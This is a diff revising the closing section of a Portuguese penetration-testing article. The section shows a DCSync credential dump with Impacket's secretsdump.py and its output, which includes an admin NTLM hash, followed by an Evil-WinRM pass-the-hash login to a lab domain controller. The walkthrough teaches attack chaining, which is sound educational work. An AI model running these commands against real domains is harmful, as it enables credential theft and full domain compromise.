@@ -160,13 +160,13 @@ WHOAMI      10.10.10.100    389    DC               distinguishedName: CN=usuari
 WHOAMI      10.10.10.100    389    DC               Member of: CN=EXCHANGE TRUSTED SUBSYSTEM,CN=Builtin,DC=dominio,DC=local
 ```
 
-## PASS-THE-HASH 2 WIN!
+## PASS-THE-HASH 4 THE WIN!
 
-Conforme exibido acima, temos a comprovação de que o script em Go funcionou perfeitamente, e que agora o nosso usuário está no grupo "EXCHANGE TRUSTED SUBSYSTEM"! Feito isso, utilizaremos a ferramenta secretsdump.py, da coleção Impacket, para realizarmos o ataque. Vale ressaltar que o grupo recém-adicionado ao usuário tem permissão de GenericAll sobre o domínio.
+Conforme exibido, temos a comprovação de que o script em Golang funcionou perfeitamente, e que agora o nosso usuário está no grupo "EXCHANGE TRUSTED SUBSYSTEM"! Feito isso, utilizaremos a ferramenta secretsdump.py, da coleção Impacket, para realizarmos o ataque. Vale ressaltar que o grupo recém-adicionado ao usuário tem permissão de GenericAll sobre o domínio.
 
 ```
-[m1kasa(@massiveattack) ~/ferramentas/impacket/examples]$ sudo python3 secretsdump.py dominio.local/usuario.atacante:'Senha123456'@DOMAINCONTROLLER.dominio.local -just-dc-ntlm -just-dc -just-dc-user "usuario.admin" -debug
-Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
+[m1kasa(@massiveattack) ~/ferramentas/impacket/examples]$ python3 secretsdump.py dominio.local/usuario.atacante:'Senha123456'@DOMAINCONTROLLER.dominio.local -just-dc-ntlm -just-dc -just-dc-user "usuario.admin" -debug
+Impacket v0.10.1.dev1+20220820.103933.3c5713e4 - Copyright 2022 SecureAuth Corporation
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
@@ -180,14 +180,14 @@ dominio.local\usuario.admin:1103:aad3b435b51404eeaad3b435b51404ee:90eb12753d51c7
 [*] Cleaning up...
 ```
 
-Com a hash em mãos, iremos desfrutar da ferramenta em ruby chamada [Evil-WinRM](https://github.com/Hackplayers/evil-winrm). A ferramenta possibilita que obtenhamos uma sessão PowerShell utilizando o protocolo WinRM, onde este se trata de um protocolo para conexão remota via linha de comando (se assemelhando ao SSH). O diferencial é que a ferramenta suporta ataques de Pass-The-Hash!
+Com a hash em mãos, iremos desfrutar da ferramenta chamada de [Evil-WinRM](https://github.com/Hackplayers/evil-winrm). A ferramenta possibilita que obtenhamos uma sessão PowerShell utilizando o protocolo WinRM, onde este se trata de um protocolo para conexão remota via linha de comando (se assemelhando ao SSH). O diferencial é que a ferramenta suporta ataques de Pass-The-Hash!
 
 ```
 [m1kasa(@massiveattack) ~/ferramentas/evil-winrm]$ ruby evil-winrm.rb -i DOMAINCONTROLLER.dominio.local -u "usuario.admin" -H 90eb12753d51c7c3ee2fe10fe224592f
 
 Evil-WinRM shell v3.4
 
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machin
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
 Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 Info: Establishing connection to remote endpoint
 
@@ -195,20 +195,20 @@ Info: Establishing connection to remote endpoint
 dominio.local\usuario.admin
 ```
 
-E.. conseguimos! Comprometemos o Domain Controller, e além do mais, com usuário administrativo! Somos administradores do domínio! Por consequência, conseguimos comprometer também todos os outros Windows que fazem parte do domínio.
+Conseguimos! Comprometemos o Domain Controller, e além do mais, com usuário administrativo! Somos administradores do domínio! Por consequência, conseguimos comprometer também todos os outros Windows que fazem parte do domínio.
 
 ## Conclusão.
 
-Durante a leitura do artigo, aprendemos sobre diferentes técnicas de ataques e como correlacioná-las pode ser útil em cenários como foi visto. Foram abordados desde exploração de vulnerabilidade web, até ataques em ambientes Active Directory, onde exigiam por parte do atacante uma boa base sobre a estrutura do AD, tais como análise de ACLs, conhecimento de protocolos, maneiras alternativas de autenticação, entre outros.
+Durante a leitura do artigo, vimos sobre diferentes técnicas de ataques e como correlacioná-las pode ser útil em cenários como foi visto. Foram abordados desde exploração de vulnerabilidade web, até ataques em ambientes Active Directory, onde exigiam por parte do atacante uma boa base sobre a estrutura do AD, tais como análise de ACLs, conhecimento de protocolos, maneiras alternativas de autenticação, entre outros.
 
 Abaixo, uma lista do que foi abordado:
 
 - Reconhecimento
-- SQL Injection
+- Injeção de SQL
 - Hash Craking
 - BloodHound: análise de ACLs
 - Programação
 - DCSync (dump de hashes NTLM)
 - Pass-The-Hash
 
-Esperamos que a leitura tenha sido interessante e que ajudem-os em casos parecidos! O principal intuito do artigo é mostrar que as vulnerabilidades podem ser utilizadas em conjunto para obter um acesso ainda maior na rede. Desde já, agradecemos por ter lido até aqui.
+Esperamos que a leitura tenha sido interessante e que ajudem-os em casos parecidos! O principal intuito do artigo é mostrar que as vulnerabilidades podem ser utilizadas em conjunto para obter um acesso ainda maior na rede. Desde já, somos gratos por ter lido até aqui.
